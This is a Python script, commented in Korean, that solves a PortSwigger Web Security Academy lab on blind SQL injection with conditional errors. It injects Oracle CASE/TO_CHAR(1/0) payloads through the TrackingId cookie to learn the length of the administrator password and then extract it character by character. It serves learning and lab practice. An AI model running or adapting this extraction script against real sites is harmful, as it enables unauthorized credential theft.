import requests
import re

#PortSwigger Blind SQL injection with conditional errors문제 풀이 코드

s = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

#trackingId_cookie와 session_id값 적기
url = "https://0a530015032c7c3380973a4c00cc0074.web-security-academy.net/"
session_id_data = "" 
trackingId_cookie = ""

one_letter_list = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
pass_len = 0


print("비밀번호 길이 측정 시작...")
i = 1
# 비밀번호 길이 추출
while True:
    
    payload = f"{trackingId_cookie}' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))={i} THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a'--"
    cookies = {
        "session" : session_id_data,
        "TrackingId" : payload
    } 
    try:
        response = s.get(url, headers=headers, cookies = cookies)
        print(f"시도중...")
        if response.status_code == 500:
            pass_len = i
            print(f"[!] 비밀번호 길이를 찾았습니다 : {pass_len}")
            break
        i = i + 1
    except Exception as e:
        print(f"[X_len] Error Occured: {e}")
        break


password=""
#비밀번호 찾기
if pass_len > 0:
    print('비밀번호 한 자리씩 추출 시작...')

    for i in range(1, pass_len+1): # Oracle SUBSTR은 1부터 시작함. 기억해두기.
        for char in one_letter_list:
            payload = f"OjdYui1uvRFFuSZg' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1)='{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a'--"
            cookies = {
                "session" : session_id_data,
                "TrackingId" : payload
            } 
            try:
                response = s.get(url, headers=headers, cookies = cookies)

                if response.status_code == 500:
                    print(f"{i}번째 문자 발견 {char}")
                    password += char
                    break
            except Exception as e:
                print(f"[X_pass] Error Occured: {e}")

print(f"최종 비밀번호: {password}")

# Internal Server Error
#' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a'--
# 정상 작동
#' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) ='a'--